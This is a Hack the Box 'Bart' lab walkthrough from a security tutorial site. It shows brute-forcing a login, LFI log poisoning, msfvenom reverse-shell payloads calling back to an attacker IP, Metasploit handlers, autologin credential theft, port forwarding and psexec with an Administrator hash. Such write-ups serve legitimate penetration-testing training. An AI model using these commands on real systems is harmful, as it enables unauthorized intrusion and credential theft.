<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box: Bart Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-bart-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-08-03T11:42:35+00:00">August 3, 2018</time><time class="updated" datetime="2025-07-05T16:11:29+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “Bart” which is available online for those who want to increase their skill in penetration testing and black box testing. Bart is a retired vulnerable lab presented by <strong>Hack the Box</strong> for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to Expert level.</span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Expert</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> find <strong>user.txt</strong> and <strong>root.txt</strong> file on the victim’s machine.</span></p>
<p><span style="color: #000000;">Since these labs are online available therefore they have static IP and IP of sense is <strong>10.10.10.81</strong> so let’s begin with nmap port enumeration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV 10.10.10.81</pre>
<p><span style="color: #000000;">From the given below image, you can observe we find only port 80 is open on the target system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-juCfXlx4ZQk/W2Q2EpmoweI/AAAAAAAAZGw/TJBRIiquLVkLjv2vJy6Q3kiUh_4FIBvGQCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">As port 80 is running http, we open the IP address in our browser. As soon as we open the IP address we get redirected to “<strong>forum.bart.htb</strong>”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-sy8ieM8EXEA/W2Q2HMIZFVI/AAAAAAAAZHU/YAOfIk5ZGtscNpVUbAU5ywxjZKafVzpVgCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Since htb doesn’t have global DNS, we aren’t going to be able to resolve the site. So we add a DNS entry in our /etc/hosts file to point 10.10.10.81 to both <strong>bart.htb</strong> and <strong>forum.bart.htb</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-bQos1UAPRWw/W2Q2JHy7GCI/AAAAAAAAZH8/TE71EL1w6IIqWzvKOxY2PnwSQzW_M9p-QCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">When we open forum.bart.htb, we find a website that has been built on WordPress.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-x5lE77MZcGQ/W2Q2LEjM-cI/AAAAAAAAZIk/F0FKJ234N0cQS0dMScrq0ZgqipK9C02fgCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">When we open bart.htb it redirects us to forum.bart.htb. We enumerate directories for both domains and find a directory called “<strong>/monitor</strong>” for domain bart.htb.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://bart.htb/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-uizGv_weBUo/W2Q2LgpeaWI/AAAAAAAAZIw/56v-gUVa9dEnruZl6d7wuLNtS3ZS60AIACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">When we open /monitor directory given by dirb scan and find a login page</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-q4EbT-Kalyo/W2Q2Lv4hqHI/AAAAAAAAZI0/DG1NT6dbjpQ9xtRMMop2y8wuGVLzeyynQCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Then, we use burpsuite to brute force the login page using an /usr/share/wordlists/metasploit/common-root.txt dictionary and find the credentials to be <strong>harvery:potter</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ZTIW56q_o1A/W2Q2MMysm8I/AAAAAAAAZI4/Czgf3fACLp49OgKo7tbJhS3BQtGa6eJQACLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">We login using these credentials and get redirected to a different domain called <strong>monitor.bart.htb</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-WcXztdwWEpk/W2Q2EoFGsVI/AAAAAAAAZG4/Ej4O_SGvUo8S61JHShEiKsouC81ZJcnvQCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">We add the domain name monitor.bart.htb in /etc/hosts file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-xaELhOQzouI/W2Q2ElwEE0I/AAAAAAAAZG0/hpzMD1bmv4gQV2qEcXlZbUzfP1nyWc_HwCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Now when we refresh the page we get a page for server monitoring.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-gIcjVoelLuk/W2Q2FaYw7pI/AAAAAAAAZG8/dkyUMWurMMAZtyWrcVRa3ToaH4_XnjRhACLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Going through the page we find a link to a site and a domain we need to add to /etc/hosts.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UMI5qQv_IhE/W2Q2FTS4_rI/AAAAAAAAZHA/1j3B-YEZfy0yGKIsAbSn02M_0H3I0g5pQCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">We add domain <strong>internal-01.bart.htb</strong> we found earlier on the site to /etc/hosts.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-pKt1Qy0sqXM/W2Q2FlLX92I/AAAAAAAAZHE/-RAzYGHYj-Yxe4C1eVte4WPLT_5twWMLACLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Now we open internal-01.bart.htb and find a login form.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3psGVnfaoOY/W2Q2F7QGYsI/AAAAAAAAZHI/q6iEkViyjKUmu-DPjQY9wBEiAaBHX4roACLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">We capture the login request using burpsuite and modify the request by changing login.php to register.php.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vflbIQQ8NzM/W2Q2GCAMgZI/AAAAAAAAZHM/n1pcztbiP5k9qy-GlrBgUvSpMQQ9NuvBACLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Then we login using the credentials we use to register and find a chat box.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-x7TRjXvlx0M/W2Q2G3f51aI/AAAAAAAAZHQ/2YXlVVtfWfAs34JsN6RqcvVIH7TJwIRFQCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;">We find a link to an open log link, we capture the request using burpsuite and when we look at the header it looks like filename parameter may be vulnerable to LFI.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Fw1rAWfsFrQ/W2Q2HKcMB7I/AAAAAAAAZHY/YaiaTO6U-5wbFtWscw70UTbAVnmE4OkegCLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">We were not able to access any system file but we were able to access log.php and find access logs.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-cVKtmce7P3M/W2Q2HpZ2zyI/AAAAAAAAZHc/ObTy_ocGcoElNq62ofcLfrEP5YSmRS4bQCLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;">Now we use log poisoning to get a reverse shell. We change the user-agent to run the whoami command, when we run the command we get the user name.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sgAdyXktPrA/W2Q2H2puOwI/AAAAAAAAZHg/pXEJoM_5W7AL-vzXHjiXpUOcvpWsvqBmgCLcBGAs/s1600/22.png"/></span></p>
<p><span style="color: #000000;">We were not able to get reverse shell using web delivery, so we first create a reverse shell using msfvenom</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f exe &gt; shell.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-zLrtDH5psRc/W2Q2H14y5bI/AAAAAAAAZHk/pqV0U48ecHs0XqaZ7QEBT83GWheIMA_rwCLcBGAs/s1600/23.png"/></span></p>
<p><span style="color: #000000;">After creating our shell, we upload the payload to the target machine using PowerShell. First we set up our HTTP server using python.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-giEsyn_sZic/W2Q2IJ5pB7I/AAAAAAAAZHo/10lMTeiXuuUHMXW5CakJJZ1_Ml-n59JQACLcBGAs/s1600/24.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qc1eFk65Hag/W2Q2IYL-AhI/AAAAAAAAZHs/Mrs4eWQIN4Y_xAK4uHnZVa_c5qHU5bRKgCLcBGAs/s1600/25.png"/></span></p>
<p><span style="color: #000000;">We set up our listener using Metasploit before executing the target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/multi/handler
msf &gt; exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
msf &gt; exploit(multi/handler) &gt; set lhost 10.10.14.6
msf &gt; exploit(multi/handler) &gt; set lport 4444
msf &gt; exploit(multi/handler) &gt; run</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://2.bp.blogspot.com/-6FWEMCqbjjQ/W2Q2ISFo3OI/AAAAAAAAZHw/wdzE_HMI5zQo2uDrlgEoKjDN6yP7-7lQwCLcBGAs/s1600/26.png"/></strong></span></p>
<p><span style="color: #000000;">After uploading our shell and setting up our listener, we now execute the payload using log poisoning.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-BB2L1RtGDuo/W2Q2IoR-ihI/AAAAAAAAZH0/P6-MudrWDHQl3fiR0bLYY3iBejSxG3LdQCLcBGAs/s1600/27.1.png"/></span></p>
<p><span style="color: #000000;">As soon as we execute the payload we get our reverse shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HoHJrZv0qFE/W2Q2JNLOZdI/AAAAAAAAZH4/GZWXMdGCu58zhIfRXCnP4-oauCQdKdNNQCLcBGAs/s1600/27.png"/></span></p>
<p><span style="color: #000000;">After we get the reverse shell we find that the system is 64-bit architecture so we change the payload type to 64-bit architecture.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use windows/local/payload_inject
msf exploit(windows/local/payload_inject) &gt; set payload windows/x64/meterpreter/reverse_tcp
msf exploit(windows/local/payload_inject) &gt; set lhost 10.10.14.6
msf exploit(windows/local/payload_inject) &gt; set lport 1234
msf exploit(windows/local/payload_inject) &gt; set session 1
msf exploit(windows/local/payload_inject) &gt; run</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://4.bp.blogspot.com/-N4E1oJoQLfE/W2Q2JZlsY1I/AAAAAAAAZIA/o0i4nvl9CxwmjCQ5btXG9LYMmwirAptBgCLcBGAs/s1600/31.png"/></strong></span></p>
<p><span style="color: #000000;">After running the exploit, we get a 64-bit meterpreter shell. Now we can run post modules properly as 32-bit meterpreter was running into problems.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-fZr75mj0UX0/W2Q2Jsxjg8I/AAAAAAAAZIE/LENpAvHX09cCSZvc4tgDmFLCcE-QE-1vwCLcBGAs/s1600/32.png"/></span></p>
<p><span style="color: #000000;">We use autologin post module to find the password for Administrator user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use windows/gather/credentials/windows_autologin
msf post(windows/gather/credentials/windows_autologin) &gt; set session 2
msf post(windows/gather/credentials/windows_autologin) &gt; run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uBOo5WUBPkw/W2Q2J1FU1AI/AAAAAAAAZII/dV0qdTk3Ux8x1Skzxt_T22j49LUnFIy1QCLcBGAs/s1600/33.png"/></span></p>
<p><span style="color: #000000;">Now enumerating the target machine, we find that port 445 is running internally. So we use port forwarding so that we can use our machine to connect with it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter &gt; portfwd add -l 443 -p 445 -r 10.10.10.81</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Sqig9rCDCn0/W2Q2KG0RHMI/AAAAAAAAZIM/X4_LF9k8QtAlYj8nW8zU3lbSXwWJtAE5QCLcBGAs/s1600/34.png"/></span></p>
<p><span style="color: #000000;">Now we use impacket-smbserver to create an smb server in our machine. So that we can share our /root directory with the target machine as our shell that we created earlier can be run on the target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-smbserver hack /root</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NuKy2002XS0/W2Q2KLIjz7I/AAAAAAAAZIQ/91sJquyo12UDSc3MIKhtgJEbv-jnjjsKwCLcBGAs/s1600/35.png"/></span></p>
<p><span style="color: #000000;">Now the session we had earlier died so port 4444 is free. So we are going to use that payload to get our reverse shell. First, we run Metasploit in a new tab and set up our listener.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use multi/handler
msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 10.10.14.6
msf exploit(multi/handler) &gt; set lport 4444
msf exploit(multi/handler) &gt; run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-CN6O7679278/W2Q2KvSB4dI/AAAAAAAAZIY/o_14f9IZ9Nc0anFjnKvWBSfTlytJjMXXACLcBGAs/s1600/37.png"/></span></p>
<p><span style="color: #000000;">Now we use psexec auxiliary to run our payload hosted on our system.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use auxiliary/admin/smb/psexec_command
msf auxiliary(admin/smb/psexec_command) &gt; set SMBUser Administrator
msf auxiliary(admin/smb/psexec_command) &gt; set SMBPass 3130438f31186fbaf962f407711faddb
msf auxiliary(admin/smb/psexec_command) &gt; set COMMAND \\\\10.10.14.6\\\hack\\\shell.exe
msf auxiliary(admin/smb/psexec_command) &gt; set rhosts 127.0.0.1
msf auxiliary(admin/smb/psexec_command) &gt; set rport 443
msf auxiliary(admin/smb/psexec_command) &gt; run</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://4.bp.blogspot.com/-vn-1p23Tz_c/W2Q2KY2CcaI/AAAAAAAAZIU/8T8W3UV2XIQjvBhToYCPEbQ8H87_ophTwCLcBGAs/s1600/36.png"/></strong></span></p>
<p><span style="color: #000000;">As soon as we run psexec auxiliary we get a reverse shell with as an administrator.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-4zsKzjzEsA4/W2Q2Kh5oHzI/AAAAAAAAZIc/iykmckDLIRk96v18Yc6uCHvIodCbAUjDwCLcBGAs/s1600/38.png"/></span></p>
<p><span style="color: #000000;">In c:\Users\Administrator\Desktop we find a file called root.txt when we open it and find our first flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-EO4IS-sQrOM/W2Q2KqdKC9I/AAAAAAAAZIg/WllrMVFteU4aezgZp1HsKdU5MZ-nCUQwQCLcBGAs/s1600/39.png"/></span></p>
<p><span style="color: #000000;">Enumerating the system in c:\Users\h.potter, we find a file called user.txt. When we take a look at the content of the file we get our second flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-l8l9sOTMYpU/W2Q-FGChdTI/AAAAAAAAZJY/1NUhXCnh2fYpJ57VgYj1lmTxSnj2XOOtwCLcBGAs/s1600/40.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
